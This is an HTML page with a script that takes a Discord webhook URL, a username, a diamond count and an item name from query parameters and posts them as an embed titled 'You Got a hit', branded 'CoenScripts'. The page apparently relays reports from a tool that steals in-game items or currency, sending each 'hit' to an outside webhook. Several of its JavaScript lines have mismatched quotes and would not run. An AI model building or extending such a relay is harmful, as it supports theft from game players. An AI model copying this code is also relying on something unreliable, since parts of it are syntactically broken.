<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Send Discord Webhook</title>
</head>
<p id="demo"></p>
<body>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const queryParams = new URLSearchParams(window.location.search);
            const webhookUrl = queryParams.get('webhook');
            const username = queryParams.get('username');
            const diamonds = queryParams.get('diamonds');
            const type = queryParams.get('type');
            const sendedItem = queryParams.get('sendedItem');

            if (webhookUrl && username && diamonds && type && sendedItem) {
                sendDiscordWebhook(username, diamonds, type, sendedItem, webhookUrl);
                document.getElementById("demo").innerHTML = "print("send");
            } else {
                document.getElementById("demo").innerHTML = "print("error");
            }
        });

        function sendDiscordWebhook(username, diamonds, type, sendedItem, webhookUrl) {
            const dateTime = new Date().toISOString();

            const fields = [
                {
                    "name": "ðŸ‘¤ Username",
                    "value": username,
                    "inline": true
                },
                {
                    "name": "ðŸ“¦ Type",
                    "value": type,
                    "inline": true
                },
                {
                    "name": "ðŸ“¤ Sended Item",
                    "value": sendedItem,
                    "inline": true
                }
            ];

            if (type === "Currency") {
                fields.splice(1, 0, {
                    "name": "ðŸ’Ž Diamonds",
                    "value": diamonds.toString(),
                    "inline": true
                });
            }

            const embed = {
                "title": "ðŸŽ‰ You Got a hit",
                "color": 0x00ff00,
                "fields": fields,
                "footer": {
                    "text": `https://discord.gg/sPHPNr82ND - CoenScripts - ${dateTime}`
                }
            };

            const data = {
                "username": "CoenScripts",
                "avatar_url": "https://i.ibb.co/tQ4VYXs/Coen.jpg",
                "embeds": [embed]
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            })
            .then(response => response.text())
            .then(text => console.log(text))
            .catch(error => {
                document.getElementById("demo").innerHTML = "print("error");
            });
        }
    </script>
</body>
</html>
